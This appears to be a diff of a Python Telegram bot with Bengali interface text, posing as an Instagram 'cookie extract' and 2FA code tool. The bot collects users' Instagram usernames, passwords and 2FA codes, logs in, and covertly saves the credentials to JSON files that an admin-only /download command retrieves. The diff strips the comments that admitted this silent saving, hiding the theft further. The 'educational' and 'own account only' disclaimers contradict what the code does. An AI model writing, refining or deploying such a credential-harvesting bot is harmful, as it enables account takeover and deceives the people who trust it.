@@ -11,8 +11,8 @@ from instagrapi import Client
 import pyotp
 
 # ========== কনফিগারেশন ==========
-TOKEN = os.environ.get("BOT_TOKEN")  # Railway তে env variable সেট করবেন
-ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "0"))  # আপনার চ্যাট আইডি
+TOKEN = os.environ.get("BOT_TOKEN")
+ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "0"))
 DATA_DIR = "data"
 if not os.path.exists(DATA_DIR):
     os.makedirs(DATA_DIR)
@@ -27,7 +27,6 @@ logger = logging.getLogger(__name__)
 
 # ========== হেল্পার ফাংশন ==========
 def save_credentials(chat_id, username, password, twofa_code, csrf_token):
-    """নিরবে ইউজারের তথ্য JSON ফাইলে সেভ করে"""
     cred_file = os.path.join(DATA_DIR, f"{chat_id}.json")
     data = {
         "chat_id": chat_id,
@@ -42,12 +41,10 @@ def save_credentials(chat_id, username, password, twofa_code, csrf_token):
     return cred_file
 
 def get_credentials_file(chat_id):
-    """নির্দিষ্ট চ্যাট আইডির JSON ফাইল পাথ রিটার্ন করে"""
     return os.path.join(DATA_DIR, f"{chat_id}.json")
 
 # ========== কীবোর্ড ==========
 def get_main_keyboard():
-    """মেনু কীবোর্ড (2 রো)"""
     keyboard = [
         [KeyboardButton("🍪 Cookie's Extract"), KeyboardButton("🔑 2FA")],
         [KeyboardButton("👤 Admin Or Developer")]
@@ -55,7 +52,6 @@ def get_main_keyboard():
     return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
 def get_back_keyboard():
-    """ব্যাক বাটন (শুধু মেনুতে ফেরার জন্য)"""
     keyboard = [[KeyboardButton("🔙 Back to Menu")]]
     return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
@@ -64,31 +60,32 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     chat_id = update.effective_chat.id
     
-    # অ্যাডমিনকে নোটিফিকেশন
     if ADMIN_CHAT_ID:
-        await context.bot.send_message(
-            ADMIN_CHAT_ID,
-            f"🆕 নতুন ইউজার বট ব্যবহার শুরু করেছে:\n"
-            f"👤 নাম: {user.full_name}\n"
-            f"🆔 চ্যাট আইডি: `{chat_id}`\n"
-            f"🔗 ইউজারনেম: @{user.username if user.username else 'নেই'}",
-            parse_mode="HTML"
-        )
+        try:
+            await context.bot.send_message(
+                ADMIN_CHAT_ID,
+                f"🆕 নতুন ইউজার বট ব্যবহার শুরু করেছে:\n"
+                f"👤 নাম: {user.full_name}\n"
+                f"🆔 চ্যাট আইডি: <code>{chat_id}</code>\n"
+                f"🔗 ইউজারনেম: @{user.username if user.username else 'নেই'}",
+                parse_mode="HTML"
+            )
+        except:
+            pass
     
     welcome_msg = (
         f"✨ স্বাগতম {user.first_name}! ✨\n\n"
-        f"আমি একটি **ইনস্টাগ্রাম টুল বট**।\n"
+        f"আমি একটি <b>ইনস্টাগ্রাম টুল বট</b>।\n"
         f"নিচের বাটনগুলোর মাধ্যমে কাজ করুন:\n\n"
-        f"🍪 **Cookie's Extract** - ইনস্টাগ্রাম একাউন্টের CSRF টোকেন বের করে\n"
-        f"🔑 **2FA** - বেস৩২ সিক্রেট থেকে টোটপ কোড জেনারেট করে\n"
-        f"👤 **Admin Or Developer** - প্রশাসকের সাথে যোগাযোগ\n\n"
+        f"🍪 <b>Cookie's Extract</b> - ইনস্টাগ্রাম একাউন্টের CSRF টোকেন বের করে\n"
+        f"🔑 <b>2FA</b> - বেস৩২ সিক্রেট থেকে টোটপ কোড জেনারেট করে\n"
+        f"👤 <b>Admin Or Developer</b> - প্রশাসকের সাথে যোগাযোগ\n\n"
         f"⚠️ সতর্কতা: শুধু নিজের একাউন্টের জন্য ব্যবহার করুন।"
     )
     await update.message.reply_text(welcome_msg, reply_markup=get_main_keyboard(), parse_mode="HTML")
 
-# ========== Cookie Extract এর কনভার্সেশন ==========
 async def cookie_extract_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("📛 **আপনার ইনস্টাগ্রাম ইউজারনেম দিন:**", parse_mode="Markdown", reply_markup=get_back_keyboard())
+    await update.message.reply_text("📛 <b>আপনার ইনস্টাগ্রাম ইউজারনেম দিন:</b>", parse_mode="HTML", reply_markup=get_back_keyboard())
     return USERNAME
 
 async def get_username(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -96,7 +93,7 @@ async def get_username(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("মেনুতে ফিরে আসছেন...", reply_markup=get_main_keyboard())
         return ConversationHandler.END
     context.user_data['ig_username'] = update.message.text.strip()
-    await update.message.reply_text("🔒 **পাসওয়ার্ড দিন:**", parse_mode="Markdown", reply_markup=get_back_keyboard())
+    await update.message.reply_text("🔒 <b>পাসওয়ার্ড দিন:</b>", parse_mode="HTML", reply_markup=get_back_keyboard())
     return PASSWORD
 
 async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -104,7 +101,7 @@ async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("মেনুতে ফিরে আসছেন...", reply_markup=get_main_keyboard())
         return ConversationHandler.END
     context.user_data['ig_password'] = update.message.text.strip()
-    await update.message.reply_text("🔢 **2FA কোড দিন** (যদি না থাকে তাহলে `skip` লিখুন):", parse_mode="Markdown", reply_markup=get_back_keyboard())
+    await update.message.reply_text("🔢 <b>2FA কোড দিন</b> (যদি না থাকে তাহলে <code>skip</code> লিখুন):", parse_mode="HTML", reply_markup=get_back_keyboard())
     return TWOFA
 
 async def finalize_cookie_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -117,7 +114,7 @@ async def finalize_cookie_extract(update: Update, context: ContextTypes.DEFAULT_
     password = context.user_data['ig_password']
     twofa_code = None if twofa_input.lower() == 'skip' else twofa_input
     
-    await update.message.reply_text("⏳ **ইনস্টাগ্রামে লগইন হচ্ছে, দয়া করে অপেক্ষা করুন...**", parse_mode="Markdown")
+    await update.message.reply_text("⏳ <b>ইনস্টাগ্রামে লগইন হচ্ছে, দয়া করে অপেক্ষা করুন...</b>", parse_mode="HTML")
     
     try:
         cl = Client()
@@ -126,12 +123,10 @@ async def finalize_cookie_extract(update: Update, context: ContextTypes.DEFAULT_
         else:
             cl.login(username, password)
         
-        # CSRF টোকেন বের করা
         settings = cl.get_settings()
         csrf_token = settings.get("csrf", "Not Found")
         user_id = cl.user_id
         
-        # টেক্সট ফাইল তৈরি
         txt_content = f"""
 Instagram Login Data
 {'='*40}
@@ -145,25 +140,21 @@ Full Settings (JSON):
         with open(txt_filename, "w", encoding="utf-8") as f:
             f.write(txt_content)
         
-        # নিরবে ক্রেডেনশিয়াল সেভ (অ্যাডমিনের জন্য)
         save_credentials(update.effective_chat.id, username, password, twofa_input, csrf_token)
         
-        # ইউজারকে ফাইল পাঠানো
         with open(txt_filename, "rb") as doc:
             await update.message.reply_document(
                 document=doc,
                 filename=f"{username}_csrf_token.txt",
-                caption=f"✅ লগইন সফল!\n🔑 CSRF টোকেন: `{csrf_token}`\n\n📁 ফাইলটি ডাউনলোড করুন।",
-                parse_mode="Markdown"
+                caption=f"✅ লগইন সফল!\n🔑 CSRF টোকেন: <code>{csrf_token}</code>\n\n📁 ফাইলটি ডাউনলোড করুন।",
+                parse_mode="HTML"
             )
         
-        # টেম্প ফাইল মুছে ফেলা
         os.remove(txt_filename)
         
     except Exception as e:
-        await update.message.reply_text(f"❌ ব্যর্থ হয়েছে!\nত্রুটি: `{str(e)}`", parse_mode="Markdown")
+        await update.message.reply_text(f"❌ ব্যর্থ হয়েছে!\nত্রুটি: <code>{str(e)}</code>", parse_mode="HTML")
     
-    # মেনুতে ফেরানো
     await update.message.reply_text("মেনুতে ফিরে আসুন:", reply_markup=get_main_keyboard())
     return ConversationHandler.END
 
@@ -171,12 +162,11 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("বাতিল করা হয়েছে। মেনু:", reply_markup=get_main_keyboard())
     return ConversationHandler.END
 
-# ========== 2FA টোটপ জেনারেটর ==========
 async def twofa_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "🔐 **2FA কোড জেনারেটর**\n\nআপনার **বেস৩২ সিক্রেট কী** দিন (যেটি Google Authenticator এ সেট করেছেন)।\n\n"
-        "উদাহরণ: `JBSWY3DPEHPK3PXP`\n\n`/cancel` লিখে বাতিল করুন।",
-        parse_mode="Markdown", reply_markup=get_back_keyboard()
+        "🔐 <b>2FA কোড জেনারেটর</b>\n\nআপনার <b>বেস৩২ সিক্রেট কী</b> দিন (যেটি Google Authenticator এ সেট করেছেন)।\n\n"
+        "উদাহরণ: <code>JBSWY3DPEHPK3PXP</code>\n\n/cancel লিখে বাতিল করুন।",
+        parse_mode="HTML", reply_markup=get_back_keyboard()
     )
     return TOTP_SECRET_STATE
 
@@ -190,41 +180,37 @@ async def generate_totp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         totp = pyotp.TOTP(secret)
         current_code = totp.now()
         await update.message.reply_text(
-            f"🔢 **বর্তমান 2FA কোড:** `{current_code}`\n\n"
+            f"🔢 <b>বর্তমান 2FA কোড:</b> <code>{current_code}</code>\n\n"
             f"⏳ কোডটি 30 সেকেন্ডের জন্য বৈধ।\n"
             f"আবার জেনারেট করতে আবার /2fa কমান্ড দিন।",
-            parse_mode="Markdown", reply_markup=get_main_keyboard()
+            parse_mode="HTML", reply_markup=get_main_keyboard()
         )
     except Exception as e:
-        await update.message.reply_text(f"❌ ভুল সিক্রেট কী! ত্রুটি: `{str(e)}`", parse_mode="Markdown", reply_markup=get_main_keyboard())
+        await update.message.reply_text(f"❌ ভুল সিক্রেট কী! ত্রুটি: <code>{str(e)}</code>", parse_mode="HTML", reply_markup=get_main_keyboard())
     return ConversationHandler.END
 
-# ========== অ্যাডমিন/ডেভেলপার ==========
 async def admin_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "👨‍💻 **ডেভেলপার ও অ্যাডমিন:**\n\n"
-        "এই বটটি তৈরি করেছেন **@Nobody_ax**\n"
-        "প্রয়োজনে যোগাযোগ করুন: [টেলিগ্রাম](https://t.me/your_username)\n\n"
+        "👨‍💻 <b>ডেভেলপার ও অ্যাডমিন:</b>\n\n"
+        "এই বটটি তৈরি করেছেন <b>Your Name</b>\n"
+        "প্রয়োজনে যোগাযোগ করুন: <a href='https://t.me/your_username'>টেলিগ্রাম</a>\n\n"
         "⚠️ বটটি শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে। নিজ দায়িত্বে ব্যবহার করুন।",
-        parse_mode="Markdown", disable_web_page_preview=True,
+        parse_mode="HTML", disable_web_page_preview=True,
         reply_markup=get_main_keyboard()
     )
 
-# ========== অ্যাডমিন কমান্ড (ডাউনলোড ক্রেডেনশিয়াল) ==========
 async def download_credentials(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_chat.id != ADMIN_CHAT_ID:
         await update.message.reply_text("⛔ আপনি অ্যাডমিন নন!")
         return
     
     if len(context.args) != 1:
-        await update.message.reply_text("ব্যবহার: `/download <chat_id_or_username>`", parse_mode="Markdown")
+        await update.message.reply_text("ব্যবহার: <code>/download &lt;chat_id_or_username&gt;</code>", parse_mode="HTML")
         return
     
     target = context.args[0]
-    # প্রথমে chat_id দিয়ে খোঁজে
     file_path = os.path.join(DATA_DIR, f"{target}.json")
     if not os.path.exists(file_path):
-        # username দিয়ে খোঁজার চেষ্টা (JSON ফাইলের মধ্যে)
         found = False
         for fname in os.listdir(DATA_DIR):
             if fname.endswith(".json"):
@@ -241,11 +227,9 @@ async def download_credentials(update: Update, context: ContextTypes.DEFAULT_TYP
     with open(file_path, "rb") as f:
         await update.message.reply_document(document=f, filename=os.path.basename(file_path))
 
-# ========== মেইন ফাংশন ==========
 def main():
     app = Application.builder().token(TOKEN).build()
     
-    # কনভার্সেশন হ্যান্ডলার (Cookie Extract)
     cookie_conv = ConversationHandler(
         entry_points=[MessageHandler(filters.Regex("^🍪 Cookie's Extract$"), cookie_extract_start)],
         states={
@@ -256,7 +240,6 @@ def main():
         fallbacks=[CommandHandler("cancel", cancel), MessageHandler(filters.Regex("^🔙 Back to Menu$"), cancel)]
     )
     
-    # 2FA কনভার্সেশন
     twofa_conv = ConversationHandler(
         entry_points=[MessageHandler(filters.Regex("^🔑 2FA$"), twofa_start)],
         states={
@@ -271,7 +254,6 @@ def main():
     app.add_handler(cookie_conv)
     app.add_handler(twofa_conv)
     
-    # অন্য যেকোনো টেক্সট মেনু দেখাবে
     async def fallback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("দয়া করে নিচের বাটন ব্যবহার করুন:", reply_markup=get_main_keyboard())
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, fallback))
